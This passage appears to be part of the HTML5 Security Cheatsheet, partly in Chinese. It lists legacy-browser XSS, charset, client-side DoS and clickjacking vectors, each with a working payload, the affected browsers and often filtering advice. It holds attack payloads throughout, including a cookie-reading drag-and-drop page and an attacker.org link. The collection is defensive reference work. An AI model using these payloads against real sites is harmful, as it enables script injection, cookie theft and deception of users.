```

*   opera 9.x
*   opera 12.0

*   xss

*   javascript
*   wmlscript
*   wml
*   opera
*   mobile
*   timer

*   [`www.w3schools.com/wap/default.asp`](http://www.w3schools.com/wap/default.asp)

*   [`www.w3schools.com/wmlscript/default.asp`](http://www.w3schools.com/wmlscript/default.asp)
*   #83

reporter：.mario

### Arbitrary payload injection via XML external DTD in IE#76test

IE will render doctype-provided entities in the "html" namespace as soon as a user defined XML stylesheet tag is present. The example works up to IE8 standards mode.

```
<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>``<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">crossdomain: 1path: [`html5sec.org/test.dtd`](http://html5sec.org/test.dtd)name: test.dtd 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   internet explorer
*   xml
*   dtd
*   arbitrary

*   #64

*   #67

reporter：LeverOne

### XML JavaScript execution via style attribute in IE#77test

IE supports the style attribute in xml-pages too. Thus JavaScript can be executed via expression() with any given tag. The example works up to IE 7 standards mode.

```
<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/> 
```

*   internet explorer 6.0
*   internet explorer 10.0

*   xss

*   javascript
*   internet explorer
*   xml
*   css
*   style

reporter：LeverOne

### Arbitrary payload injection via XSL + XDR-schema in IE#78test

The namespace "html" is automatically determined using XSL. Missing attributes for the <img> tag such as "onerror" are obtained from the XDR-schema - and will then execute JavaScript. The example works up to IE 8 standards mode.

```
<?xml-stylesheet type="text/xsl" href="#"?><img />``<?xml version="1.0"?> <Schema name="x" > <ElementType name="img"> <AttributeType name="src" required="yes" default="x"/> <AttributeType name="onerror" required="yes" default="alert(1)"/> <attribute type="src"/> <attribute type="onerror"/> </ElementType> </Schema>crossdomain: 1path: [`html5sec.org/test.xdr`](http://html5sec.org/test.xdr)name: test.xdr 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   internet explorer
*   xml
*   xdr
*   arbitrary
*   xml data reduced
*   xsl

*   [`msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx`](http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx)

reporter：LeverOne

### Active JavaScript execution via XLink#81test

FF supports the "xlink:actuate" attribute and allows displaying XML link without additional styles. The default namespace here is "html".

```
<x  xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/> 
```

*   firefox 3.0
*   firefox 3.6.28

*   xss

*   javascript
*   xlink
*   firefox
*   xml

*   [`www.w3.org/TR/xlink/#actuate-att`](http://www.w3.org/TR/xlink/#actuate-att)

*   [`www.w3.org/TR/2010/REC-xlink11-20100506/`](http://www.w3.org/TR/2010/REC-xlink11-20100506/)
*   #68
*   #87

reporter：LeverOne, .mario

### JavaScript execution via XML stylesheet, data URI and expression()#82test

Internet Explorer 8 to 10 support data URIs and thus are capable of including stylesheets this way. By using a xml stylesheet tag and a data URI containing an expression() it's possible to execute JavaScript without user interaction.

```
<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?> 
```

*   internet explorer 8.0
*   internet explorer 10.0

*   xss

*   javascript
*   xml stylesheet
*   css
*   internet explorer
*   expression
*   xml

*   [`www.w3.org/TR/xml-stylesheet/`](http://www.w3.org/TR/xml-stylesheet/)

reporter：.mario

### Obfuscated WML injection via undeclared WAP-ML Variables#83test

The example demonstrates the use in WML undeclared variables (are ignored). These variables can be declared in the tags <setvar>, <input>, <select>. Namespace indicated for use inside the XML-file. Also inside WML-files can you use a lot of regular HTML-tags.

```
<x:template  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template> 
```

*   opera 9.x
*   opera 12.0

*   xss

*   javascript
*   wml
*   opera
*   mobile
*   timer
*   variable

*   [`www.w3schools.com/wap/wml_variables.asp`](http://www.w3schools.com/wap/wml_variables.asp)

*   #69

reporter：LeverOne, .mario

### Opera JavaScript execution via XML-events handler#84test

The browser tries to load an external XML-event handler and execute JavaScript without user interaction. The problem seems to be fixed in Opera 11.

```
<x  ev:event="load" ev:handler="javascript:alert(1)//#x"/> 
```

*   opera 9.x
*   opera 11.01

*   xss

*   javascript
*   opera
*   event
*   handler

*   [`www.w3.org/TR/xml-events/`](http://www.w3.org/TR/xml-events/)

*   #85

reporter：LeverOne

### Arbitrary payload injection in Opera via XML-events handler#85test

The browser loads an external xml-event handler, which contains the JavaScript code. This example also works with data URIs.

```
<x  ev:event="load" ev:handler="test.evt#x"/>``<script  id="x">alert(1)</script>crossdomain: 1path: [`html5sec.org/test.evt`](http://html5sec.org/test.evt)name: test.evt 
```

*   opera 9.x
*   opera 12.0

*   xss

*   javascript
*   opera
*   event
*   handler
*   arbitrary

*   [`www.w3.org/TR/xml-events/`](http://www.w3.org/TR/xml-events/)

*   #94
*   #104
*   #127

reporter：LeverOne

### Executing JavaScript with WD-XSL, <eval> elements and "expr" attributes#135test

Internet Explorer, when loading an XML document in an older document mode, allows the use of a legacy XSL version called WD-XSL. This version, shipped with several proprietary extras, allows execution of JavaScript and other script code in very uncommon ways. The browser for instance supports an <eval> element and "expr" attributes that can directly be fed with script code or references to existing JavaScript and XMLDOM methods. Other than MSXSL script, direct DOM access is possible with the use of WD-XSL.

```
<?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet > <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if> </template> </stylesheet> 
```

Websites rendered in XML- or XML-like MIME types should not allow untrusted input without heavy filtering. Unknown elements can cause unexpected script execution depending on browser and render mode. The use of custom namespaces in user generated input should be prohibited.

*   internet explorer 5.5
*   internet explorer latest (in older docmodes)

*   xss

*   xslt
*   internet explorer
*   xml
*   wdxsl
*   legacy

*   [`web.archive.org/web/20000816185012/http://msdn.microsoft.com/xml/reference/xsl/XSLElements.asp`](http://web.archive.org/web/20000816185012/http://msdn.microsoft.com/xml/reference/xsl/XSLElements.asp)

*   [`web.archive.org/web/20000816000901/http://msdn.microsoft.com/xml/reference/xsl/xslmethods.asp`](http://web.archive.org/web/20000816000901/http://msdn.microsoft.com/xml/reference/xsl/xslmethods.asp)

reporter：.mario

## UTF-7 和其它诡异的编码集的向量

### 通过 x-imap4-modified-utf7 编码进行 XSS (1)#2test

这个向量说明 UTF-7 编码能产生很多你意想不到的 XSS 向量.

```
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi 
```

确保没有被注入<META>标签,及网站已申明了上下文的编码方式.

*   firefox 2.x
*   firefox 3.6.28

*   xss

*   utf7
*   firefox
*   charset

reporter：.mario

### 通过 x-imap4-modified-utf7 编码进行 XSS (2)#3test

这个向量说明 UTF-7 编码能产生很多你意想不到的 XSS 向量.

```
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&> 
```

确保没有被注入<META>标签,及网站已申明了上下文的编码方式.

*   firefox 2.x
*   firefox 3.6.28

*   xss

*   utf7
*   firefox
*   charset

reporter：.mario

### XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew#19test

Buggy charset implementations in Firefox allow to craft HTML structures without using the usual characters such as < and >. Most affected charsets are from the Mac charset family - such as mac-farsi, mac-arabic and mac-hebrew.

```
<meta charset="x-mac-farsi">?script ?alert(1)//?/script ? 
```

User input should never allow <META> tags to avoid re-setting the charset. In case the website is encoded in one of the affected charsets make sure to have your filter be aware that for Firefox < (<) and ¼ are equivalent - as well as other characters too.

*   firefox 2.x
*   firefox 3.6.28

*   x-mac-arabic

*   x-mac-farsi
*   x-mac-hebrew
*   firefox
*   charset

*   [`twitter.com/#!/hasegawayosuke/status/25984750035`](https://twitter.com/#!/hasegawayosuke/status/25984750035)

reporter：hasegawayosuke

## 客户端 DOS 向量

### 通过 repeat templates DoS 客户端#13test

这个向量是使用 WebForms 2.0 草案中的 repeat template 规范.利用嵌套一遍一遍的 repeat 标签本身,使用客户端崩溃.

```
<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x> 
```

不要允许用户提交的 HTML 中包含 repeat 或 repeat 或 repeat-start、repeat-end 属性.如果有这需求可以验证他们的值是否过大.

*   opera 10.0
*   opera 10.10

*   dos

*   repeat
*   template
*   webforms
*   opera
*   proprietary

*   [`www.whatwg.org/specs/web-forms/current-work/#repeatingFormControls`](http://www.whatwg.org/specs/web-forms/current-work/#repeatingFormControls)

reporter：.mario

### 通过恶意的正则表达式 DoS 客户端#14test

Opera 10 支持使用 pattern 属性进行验证,如果正则表达式写的有问题,那么可能会导致"dossed".

```
<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!> 
```

不要允许用户提交的 HTML 中含有"pattern"属性,确保验证的正则写的没啥问题.

*   opera 10.0

*   dos

*   pattern
*   regex
*   html5
*   validation
*   opera
*   proprietary

*   [`www.whatwg.org/specs/web-apps/current-work/#the-pattern-attribute`](http://www.whatwg.org/specs/web-apps/current-work/#the-pattern-attribute)

*   [`en.wikipedia.org/wiki/Regular*expression_Denial_of_Service*-_ReDoS`](http://en.wikipedia.org/wiki/Regular_expression_Denial_of_Service_-_ReDoS)

reporter：.mario

### Input stealing/form DoS with onblur=focus() and autofocus#22test

This very basic vector demonstrates how the combination of "autofocus" and "onblur" can render any other form on the targeted website useless.

```
<input onblur=focus() autofocus><input> 
```

User submitted markup should not contain "autofocus" attributes.

*   opera 9.0
*   opera latest

*   chrome 3.0

*   chrome latest

*   safari 5.0

*   safari latest

*   dos

*   javascript
*   opera
*   chrome
*   safari
*   autofocus
*   onblur
*   html5

*   [`www.w3.org/Bugs/Public/show_bug.cgi?id=9602`](http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602)

reporter：Skyphire, Gareth, .mario

## HTML behavior 和 binding 相关向量

### 使用 HTML+TIME 和 onbegin 执行 Javascript#16test

使用 HTML+TIME behavior 可以使任意标签处理 onbegin 事件.

```
X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` > 
```

不允许用户在提交的标签或 CSS 中含有 behavior 属性,HTML+TIME API 提供了很多方法来执行 Javascript,如果有可能,不用使用黑名单的方式处理 HTML 危险标签.

*   internet explorer 5.5
*   internet explorer 8.0

*   xss

*   javascript
*   ie
*   behavior
*   html+time
*   onbegin

*   [`msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx)

reporter：.mario

### JavaScript execution via HTML+TIME without user interaction (1)#24test

This obfuscated vector uses HTML+TIME to execute JavaScript without user interaction - and without suspicious event handlers but just "attributename" and "to" attributes.

```
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`> 
```

Don't allow behavior properties in user submitted CSS and markup and don't rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.

*   internet explorer 5.5
*   internet explorer 8.0

*   xss

*   javascript
*   ie
*   behavior
*   html+time
*   attributename
*   to
*   proprietary

*   [`msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx)

reporter：.mario

### JavaScript execution via HTML+TIME without user interaction (2)#28test

This HTML+TIME vector utilized the attributes "attributename" and "values" to map encoded markup into an attribute to execute JavaScript.

```
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;> 
```

As soon as the HTML+TIME namespace and the behavior property are mapped to a HTML element a whole range of new attributes to execute JavaScript is available. In user submitted html "xmlns" attributes should not be allowed - as well as "behavior" properties for style tags and attribtes. Don't rely on blacklisting when dealing with user submitted markup.

*   internet explorer 5.5
*   internet explorer 8.0

*   xss

*   javascript
*   internet explorer
*   behavior
*   style
*   html+time
*   attributename
*   values
*   proprietary

*   [`msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx)

reporter：LeverOne

### VML frame with embedded VML object plus onmouseover#34test

A VML frame object works by giving the VML frame a "src" attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.

```
1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe> 
```

Don't allow behavior properties in user submitted CSS and markup and don't rely on blacklists regarding dangerous HTML tags.

```
<xml> <rect style="height:100%;width:100%" id="xss" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>crossdomain: 1name: test.vml 
```

*   internet explorer 5.5
*   internet explorer latest (in older docmode)

*   xss

*   javascript
*   style
*   behavior
*   vml
*   internet explorer
*   proprietary

*   [`msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx)

reporter：[`www.malware.com`](http://www.malware.com)

### VML line object utilizing href attribute with JavaScript URI#35test

The vector paints a very thick and wide line responding to clicks with JavaScript execution via JavaScript URI. Note that the actual URI is being masked in the status bar. During an overlay attack the victim will not know about the payload via status bar.

```
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a> 
```

Don't allow behavior properties in user submitted CSS and markup and don't rely on blacklists regarding dangerous HTML tags.

*   internet explorer 5.5
*   internet explorer latest (in older docmode)

*   xss

*   javascript
*   style
*   behavior
*   vml
*   internet explorer
*   proprietary

*   [`msdn.microsoft.com/en-us/library/bb229513%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/bb229513%28VS.85%29.aspx)

reporter：LeverOne

### AnchorClick behavior enabling folder attribute as href replacement#36test

Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements. This example works up to IE 8 standards mode.

```
<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a> 
```

Don't allow behavior properties in user submitted CSS and markup and don't rely on blacklists regarding dangerous HTML tags.

*   internet explorer 5.5
*   internet explorer latest (in older docmode)

*   xss

*   javascript
*   style
*   behavior
*   anchorclick
*   internet explorer
*   proprietary

*   [`msdn.microsoft.com/en-us/library/ms531414%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms531414%28VS.85%29.aspx)

reporter：.mario

### Internet Explorer Scriptlets executing JavaScript#52test

Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.

```
<x style="behavior:url(test.sct)"> 
```

Users should not be able to either submit CSS or HTML containing style attributes. If necessary make sure the "behavior" property is not whitelisted.

```
<SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS> <SCRIPT Language="javascript">alert(1)</SCRIPT> </SCRIPTLET>crossdomain: 0name: test.sct 
```

*   internet explorer 5.5
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   behavior
*   scriptlet
*   internet explorer
*   style
*   css
*   sct

*   [`msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx`](http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx)

*   [`msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx)

reporter：.mario

### Internet Explorer Data Islands executing JavaScript#53test

Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.

```
<xml id="xss" src="test.htc"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label> 
```

Users should not be able to submit HTML containing <XML> tags. If necessary make sure the "dataformatas" and "datasrc" attributes are not whitelisted.

```
<?xml version="1.0"?> <x> <payload><![CDATA[<img src=x onerror=alert(1)>]]></payload> </x>crossdomain: 0path: [`html5sec.org/test.htc`](http://html5sec.org/test.htc)name: test.htc 
```

*   internet explorer 5.5
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   behavior
*   internet explorer
*   style
*   css
*   data island

*   [`msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx)

reporter：.mario

### Server-sent events - Opera and <EVENT-SOURCE> tags (1)#73test

Opera allows using <EVENT-SOURCE> elements. In case the "src" attribute points to a valid cross domain source it's possible to have the element listen for events and the containing data.

```
<event-source src="event.php" onload="alert(1)"> 
```

Make sure users cannot influence the source of <EVENT-SOURCE> elements and don't whitelist the tag itself inside user submitted markup.

```
<?php header("Content-Type: application/x-dom-event-stream"); die("Event: load\ndata: \n\n"); ?>crossdomain: 1path: [`html5sec.org/event.php`](http://html5sec.org/event.php)name: event.php 
```

*   opera 8.x
*   opera 10.63

*   xss

*   javascript
*   event-source
*   opera
*   sse

*   [`hixie.ch/specs/html/server-sent-events/server-sent-events`](http://hixie.ch/specs/html/server-sent-events/server-sent-events)

reporter：.mario

### Server-sent events - Opera and <EVENT-SOURCE> tags (2)#74test

Opera allows using <EVENT-SOURCE> tags to receive server-sent events. In this example a data URI is being used as an event source triggering a click on another HTML element. In an attack scenario an XSS requiring user interaction can be turned into an active script execution this way.

```
<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a> 
```

Make sure users cannot influence the source of <EVENT-SOURCE> elements and don't whitelist the tag itself inside user submitted markup.

*   opera 8.x
*   opera 10.63

*   xss

*   javascript
*   event-source
*   opera
*   sse

*   [`hixie.ch/specs/html/server-sent-events/server-sent-events`](http://hixie.ch/specs/html/server-sent-events/server-sent-events)

reporter：.mario

### Internet Explorer applying behavior via <import namespace>#116test

Internet Explorer allows to apply namespaces and attach behaviors not only by using CSS but <import> or <?import> tags. The example shows how to work with HTML+TIME behaviors without using style attributes or tags and cause script execution via the to attribute. If there is no attribute "targetElement", will be overridden "innerHTML" property of the <body> tag. To limit the area that be changed, you can use the attribute "targetElement". This syntax is also supported in IE9 for non-obsolete behaviors.

```
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;"> 
```

*   internet explorer 6.0
*   internet explorer 8.0

*   xss

*   behavior
*   import
*   xml
*   namespace
*   time
*   entities

*   [`msdn.microsoft.com/en-us/library/ms533793%28v=vs.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms533793%28v=vs.85%29.aspx)

*   #16
*   #24
*   #28

reporter：LeverOne, GreyMagic

## Clickjacking 和 UI Redressing 的向量

### Reverse clickjacking via <IFRAME>#117test

Internet Explorer allows to place <IFRAME> tags inside <A> tags. By clicking on a not clickable element inside the IFRAME there will be executed the URL defined in the "href" attribute of the <A> tag.

```
<a href="http://attacker.org"> <iframe src="http://example.org/"></iframe> </a> 
```

*   internet explorer 8.0
*   internet explorer 9.0

*   clickjacking

*   internet explorer
*   iframe

*   [`iseclab.org/papers/asiaccs122-balduzzi.pdf`](http://iseclab.org/papers/asiaccs122-balduzzi.pdf)

reporter：mniemietz

### Text injection by drag-and-drop#118test

The method "setData" allows, with the event handler "ondragstart" and the attribute "draggable" with the value "true", to drag the text "malicious code" and not "Drop me" into the IFRAME. This IFRAME can consist of a web page with an input field to drop in data. Note that cross-origin drag&drop has meanwhile been heavily restricted in power due to security risks.

```
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"> <h1>Drop me</h1> </div> <iframe src="http://www.example.org/dropHere.html"></iframe> 
```

*   opera 12.0

*   firefox 3.x

*   firefox 15.0

*   safari 5.0

*   safari 5.1.7

*   clickjacking

*   firefox
*   drag-and-drop
*   setData
*   ondragstart
*   draggable

*   [`www.w3.org/TR/html5/dnd.html#dnd`](http://www.w3.org/TR/html5/dnd.html#dnd)

reporter：mniemietz

### Content extraction via view-source#119test

To show the source code of a web page inside the web browser Mozilla Firefox or Google Chrome, "view-source:" can be used as a prefix for the URL. Firefox - and that is essential for this vector - allows iframes to show view-source: URLs. With the combination of a "textarea" tag, just two drags to perform this attack are needed, as in the case of elements like images. The first drag is to select an element and the second to drag an element out of the iframe into the text area. This method also bypasses CSS and JS based clickjacking protection.

```
<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe> <textarea type="text" cols="50" rows="10"></textarea> 
```

*   firefox 2.x
*   firefox 13.0

*   clickjacking

*   firefox
*   content extraction
*   view-source

*   [`www.contextis.co.uk/resources/white-papers/clickjacking/Context-Clickjacking_white_paper.pdf`](http://www.contextis.co.uk/resources/white-papers/clickjacking/Context-Clickjacking_white_paper.pdf)

reporter：mniemietz

### Pop-up blocker bypass#120test

A web browser like Firefox distinguishes between trusted and not trusted events, depending on the situation. User interactions like a click will be trusted for the reason that they are made explicitly by the user. If a web page initiates an event like opening a pop-up window automatically, the event is not trusted and therefore blocked. Tests have shown that other browsers like Google Chrome or Opera behave similarly. With the use of clickjacking techniques, an attacker can get its victim to create a trusted event by clicking on a link that opens one or more pop-up windows. Thus, an attacker can get the victim to unknowingly trigger a trusted event by doing a click. This event can be recycled by an attacker for later usage or directly used to e.g. generate pop-up windows that the user does not desire.

```
<script> function makePopups(){ for (i=1;i<6;i++) { window.open('popup.html','spam'+i,'width=50,height=50'); } } </script> <body> <a href="#" onclick="makePopups()">Spam</a> 
```

*   internet explorer 5.0
*   internet explorer 9.0

*   firefox 2.x

*   firefox latest

*   chrome 6.0

*   chrome 23.0

*   safari 5.0

*   safari 5.1.7

*   clickjacking

*   internet explorer
*   opera
*   firefox
*   chrome
*   safari
*   pop-up

*   [`help.dottoro.com/ljoljvsn.php`](http://help.dottoro.com/ljoljvsn.php)

*   [`ui-redressing.mniemietz.de/uiRedressing.pdf`](http://ui-redressing.mniemietz.de/uiRedressing.pdf)

reporter：mniemietz

### SVG masking#121test

Masking elements can greatly simplify a clickjacking attack. Here, a "body" tag with the "style" attribute "background:gray" is given. As the name suggests, the background of the web page will have the color gray. The "iframe" tag holds the attributes "src" and "style". The URL of the target web page is the value of the "src" attribute. Inside the "style" attribute there is information to the width, the height, and the border of the web page. Finally, there is the property "mask" with "url(#maskForClickjacking)". This "url" points to an SVG with the "id" value "maskForClickjacking". On the next line, an "svg" tag with the namespace "svg" is de?ned. After that, a "mask" tag with the attributes "id", "maskUnits" and "maskContentUnits" is inside the "svg" tag. The attribute "id" holds the value "maskForClickjacking", which is exactly the value inside the "url". The attribute "maskUnits" de?nes the coordinate system for the data of "x", "y", "width" and "height". The second attribute "maskContentUnits" de?nes the coordinate system for the contents of the "mask" with "objectBoundingBox". Inside the "mask" tag, there are two tags called "rect" and "circle". Each tag holds information to the position and is determined by the geometric shape the width and height or radius. The attribute "fill", with the value "white", ensures that the viewing whole in the mask is visible.

```
<html  > <body style="background:gray"> <iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/> <svg:svg> <svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"> <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/> <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/> </svg:mask> </svg:svg> </body> </html> 
```

*   firefox 3.x
*   firefox latest

*   clickjacking

*   firefox
*   svg
*   masking

*   [`www.w3.org/Graphics/SVG/`](http://www.w3.org/Graphics/SVG/)

*   [`www.w3.org/TR/SVG/masking.html`](http://www.w3.org/TR/SVG/masking.html)
*   [`www.gnucitizen.org/blog/even-more-advanced-clickjacking/`](http://www.gnucitizen.org/blog/even-more-advanced-clickjacking/)

reporter：mniemietz

### Sandboxed Iframes#122test

Google Chrome implements the HTML5 "sandboxed iframes". This particular example shows on how to turn this feature against websites only using JavaScript based frame-busters. Note that the framed website can still execute JavaScript - but has no privileges to modify the top frame's location. This would only be possible if the sandbox attribute also came with the "allow-top-navigation" parameter.

```
<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe> 
```

*   chrome 8.0
*   chrome latest

*   internet explorer 10.0

*   internet explorer latest

*   safari 5.1.7

*   safari latest

*   opera 15.0

*   opera latest

*   clickjacking

*   chrome
*   iframe
*   sandbox

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-sandbox`](http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-sandbox)

*   [`blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html`](http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html)

reporter：kkotowicz

### Classjacking with jQuery#123test

CSS offers the attribute "class" as a selector to style a group of HTML elements. Consequently, it is feasible to style e.g. "span" and "a" tags. Here, the "span" tag has the value "foo" and the "a" tag the value "bar" inside the "class" attribute. This values can be used to define the font size or other CSS-specific properties. The first "script" tag holds an "src" attribute with the value "[`code.jquery.com/jquery-1.4.4.js`](http://code.jquery.com/jquery-1.4.4.js)". It is a reference to a file of the "jQuery JavaScript Library v1.4.4". The name "jQuery" stands for a JavaScript Library that simplifies HTML document traversing, event handling, animating, and Ajax interactions. So it is ideally suited to deal with user interactions and to manipulate them, as required for complex UI redressing attacks. Thus, "jQuery" is given in the second "script" tag. At first, the "span" tag is selected, which holds the value "foo" in the "class" attribute. After that, ".click" is implemented. It can be used to bind an event handler to the "click" JavaScript event, or to trigger that event on an element. In this case, an alert window will be executed with the text "foo" after clicking on the "Some text" value of the "span" tag. After closing the alert window, a click event is triggered on the "a" tag with the value "bar" inside the "class" attribute. Analogue to the first event, an alert window appears with the text "bar". After closing the alert window, the web browser will redirect the web page to "[`html5sec.org`](http://html5sec.org)". If there is a click on the link "[`www.example.org`](http://www.example.org)" and not on the text "Some text", an alert window is displayed with the text "bar" followed by a redirection to "[`example.org`](http://example.org)" and not "[`html5sec.org`](http://html5sec.org)". This behaviour follows from the "href" attribute.

```
<span class=foo>Some text</span> <a class=bar href="http://www.example.org">www.example.org</a> <script src="http://code.jquery.com/jquery-1.4.4.js"></script> <script> $("span.foo").click(function() { alert('foo'); $("a.bar").click(); }); $("a.bar").click(function() { alert('bar'); location="http://html5sec.org"; }); </script> 
```

*   internet explorer latest

*   opera 10.x

*   opera latest

*   firefox 2.x

*   firefox latest

*   chrome 8.0

*   chrome latest

*   safari 5.0

*   safari latest

*   clickjacking

*   classjacking
*   jQuery
*   class

*   [`www.w3schools.com/Css/css_id_class.asp`](http://www.w3schools.com/Css/css_id_class.asp)

*   [`jquery.com/`](http://jquery.com/)
*   [`api.jquery.com/click/`](http://api.jquery.com/click/)
*   [`ui-redressing.mniemietz.de/uiRedressing.pdf`](http://ui-redressing.mniemietz.de/uiRedressing.pdf)

reporter：mniemietz

### Passive XSS via Drag&Drop of specially crafted URIs#131test

It is possible to bypass Mozilla Firefox (tested on version 8.x and 9.x) internal protection and execute JavaScript Drag and Drop by using capitalization and Feed protocol, and to run that JavaScript on the top page if you can include the malicious page in an IFrame. The "event.preventDefault()" method in "ondragover" event of the element is to block the natural function of the browser. Usually the malicious IFrame should deceive the user to drag and drop a JS to the drop box which can be concealed in a hidden "Textarea" element.

```
<b>drag and drop one of the following strings to the drop box:</b> <br/><hr/> jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b> <br/><hr/> feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div> 
```

*   firefox 6
*   firefox 10.0.2

*   drag&drop

*   html5
*   iframe
*   feed
*   firefox

*   [`bugzilla.mozilla.org/show_bug.cgi?id=704354`](https://bugzilla.mozilla.org/show_bug.cgi?id=704354)

*   [`soroush.secproject.com/blog/2011/12/drag-and-drop-xss-in-firefox-by-html5-cross-domain-in-frames/`](http://soroush.secproject.com/blog/2011/12/drag-and-drop-xss-in-firefox-by-html5-cross-domain-in-frames/)

reporter：irsdl